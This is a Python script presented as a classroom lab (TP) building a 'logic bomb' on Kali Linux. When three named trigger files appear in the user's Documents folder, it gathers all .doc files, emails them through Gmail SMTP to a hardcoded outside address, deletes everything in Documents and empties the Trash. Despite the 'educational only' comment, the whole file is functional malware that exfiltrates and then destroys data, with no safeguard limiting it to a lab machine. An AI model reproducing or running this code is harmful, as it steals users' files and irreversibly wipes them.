import os
import glob
import shutil
import smtplib
import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email import encoders

# ============================================================
# TP N°1 — Bombe logique | Kali Linux / VMware
# Code Python — A executer dans la VM Kali Linux
# AVERTISSEMENT : Strictement educatif — environnement VM isole
# ============================================================

# --- Configuration email (a remplir avant execution) ---
EMAIL_EXPEDITEUR   = "votre.email@gmail.com"    # Adresse Gmail
EMAIL_MOT_DE_PASSE = "xxxx xxxx xxxx xxxx"      # Mot de passe d'application Gmail
EMAIL_DESTINATAIRE = "jesse.mpiga@a-ct.ma"      # Adresse de reception

# --- Repertoire cible (Linux) ---
DOCUMENTS = os.path.join(os.path.expanduser("~"), "Documents")

# --- Corbeille Linux ---
CORBEILLE = os.path.join(os.path.expanduser("~"), ".local", "share", "Trash")

# --- Les 3 fichiers declencheurs ---
# La bombe s'active quand ces 3 fichiers sont SIMULTANEMENT dans Documents
FICHIERS_DECLENCHEURS = [
    "declencheur1.txt",   # Remplacer par le nom exact donne par le prof
    "declencheur2.txt",
    "declencheur3.txt",
]


# ============================================================
# ETAPE 1 — Verification des conditions de declenchement
# ============================================================
def verifier_declencheur():
    """
    Verifie si les 3 fichiers declencheurs sont presents
    simultanement dans le dossier Documents.
    Inspire du code du professeur.
    """
    print("[INFO] Verification des conditions de declenchement...")
    fichiers_presents = []

    for nom in FICHIERS_DECLENCHEURS:
        chemin = os.path.join(DOCUMENTS, nom)
        present = os.path.exists(chemin)
        statut = "PRESENT" if present else "absent"
        print(f"  [{statut}] {nom}")
        if present:
            fichiers_presents.append(nom)

    if len(fichiers_presents) == len(FICHIERS_DECLENCHEURS):
        print("[ALERTE] Tous les declencheurs sont presents ! Activation de la bombe.")
        return True

    manquants = len(FICHIERS_DECLENCHEURS) - len(fichiers_presents)
    print(f"[OK] {manquants} declencheur(s) manquant(s). Systeme securise.")
    return False


# ============================================================
# ETAPE 2 — Collecte des fichiers .doc dans Documents
# ============================================================
def collecter_fichiers_doc():
    """
    Recupere tous les fichiers *.doc dans le dossier Documents.
    """
    print("\n[ACTION] Collecte des fichiers .doc dans Documents...")
    pattern = os.path.join(DOCUMENTS, "*.doc")
    fichiers = glob.glob(pattern)

    if not fichiers:
        print("  Aucun fichier .doc trouve dans Documents.")
    else:
        for f in fichiers:
            print(f"  Fichier recupere : {f}")

    return fichiers


# ============================================================
# ETAPE 3 — Envoi des fichiers par email
# ============================================================
def envoyer_par_email(fichiers):
    """
    Envoie les fichiers .doc a l'adresse email configuree.
    Utilise Gmail SMTP SSL (port 465).
    Necessite un mot de passe d'application Gmail.
    """
    if not fichiers:
        print("\n[INFO] Aucun fichier .doc a envoyer.")
        return

    print(f"\n[ACTION] Envoi de {len(fichiers)} fichier(s) a {EMAIL_DESTINATAIRE}...")

    try:
        msg = MIMEMultipart()
        msg["From"]    = EMAIL_EXPEDITEUR
        msg["To"]      = EMAIL_DESTINATAIRE
        msg["Subject"] = f"Rapport automatique - {datetime.datetime.now().strftime('%Y-%m-%d')}"

        corps = f"Fichiers recuperes automatiquement le {datetime.datetime.now()}."
        msg.attach(MIMEText(corps, "plain"))

        for chemin_fichier in fichiers:
            with open(chemin_fichier, "rb") as f:
                piece = MIMEBase("application", "octet-stream")
                piece.set_payload(f.read())
                encoders.encode_base64(piece)
                piece.add_header(
                    "Content-Disposition",
                    f"attachment; filename={os.path.basename(chemin_fichier)}"
                )
                msg.attach(piece)

        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as serveur:
            serveur.login(EMAIL_EXPEDITEUR, EMAIL_MOT_DE_PASSE)
            serveur.sendmail(EMAIL_EXPEDITEUR, EMAIL_DESTINATAIRE, msg.as_string())

        print(f"[OK] Email envoye avec succes a {EMAIL_DESTINATAIRE}.")

    except smtplib.SMTPAuthenticationError:
        print("[ERREUR] Authentification Gmail echouee.")
        print("         -> Verifiez EMAIL_EXPEDITEUR et EMAIL_MOT_DE_PASSE")
        print("         -> Utilisez un mot de passe d'application Gmail (pas le mot de passe normal)")
    except Exception as e:
        print(f"[ERREUR] Echec envoi email : {e}")


# ============================================================
# ETAPE 4 — Suppression du contenu de Documents
# ============================================================
def supprimer_documents():
    """
    Supprime tout le contenu du dossier Documents (Linux).
    Equivalent de shutil.rmtree() mentionne dans le code du professeur.
    """
    print(f"\n[ACTION] Suppression du contenu de : {DOCUMENTS}")
    try:
        supprime = 0
        for element in os.listdir(DOCUMENTS):
            chemin = os.path.join(DOCUMENTS, element)
            if os.path.isfile(chemin):
                os.remove(chemin)
                supprime += 1
            elif os.path.isdir(chemin):
                shutil.rmtree(chemin)
                supprime += 1
        print(f"[OK] {supprime} element(s) supprime(s) de Documents.")
    except PermissionError as e:
        print(f"[ERREUR] Permission refusee : {e}")
    except Exception as e:
        print(f"[ERREUR] Suppression echouee : {e}")


# ============================================================
# ETAPE 5 — Vidage de la Corbeille (Linux)
# ============================================================
def vider_corbeille():
    """
    Vide la Corbeille sous Linux (Kali).
    La corbeille Linux est dans ~/.local/share/Trash/
    """
    print(f"\n[ACTION] Vidage de la Corbeille Linux : {CORBEILLE}")
    try:
        vide = 0
        for sous_dossier in ["files", "info", "expunged"]:
            chemin = os.path.join(CORBEILLE, sous_dossier)
            if os.path.exists(chemin):
                for element in os.listdir(chemin):
                    cible = os.path.join(chemin, element)
                    if os.path.isfile(cible):
                        os.remove(cible)
                        vide += 1
                    elif os.path.isdir(cible):
                        shutil.rmtree(cible)
                        vide += 1
        print(f"[OK] Corbeille videe ({vide} element(s) supprimes).")
    except Exception as e:
        print(f"[ERREUR] Vidage corbeille echoue : {e}")


# ============================================================
# PROGRAMME PRINCIPAL
# ============================================================
def principale():
    print("=" * 60)
    print("  TP N 1 - Bombe logique Python | Kali Linux")
    print(f"  Date : {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("=" * 60)
    print()

    # Verification du declencheur (les 3 fichiers dans Documents)
    if not verifier_declencheur():
        print("\nLe systeme est securise. En attente...")
        return

    print("\n[ALERTE] Conditions de declenchement remplies.")
    print("Execution de la charge utile...\n")

    # 1. Collecte des fichiers .doc
    fichiers_doc = collecter_fichiers_doc()

    # 2. Envoi par email
    envoyer_par_email(fichiers_doc)

    # 3. Suppression du contenu de Documents
    supprimer_documents()

    # 4. Vidage de la Corbeille
    vider_corbeille()

    print()
    print("=" * 60)
    print("[FIN] Charge utile executee.")
    print("=" * 60)


if __name__ == "__main__":
    principale()
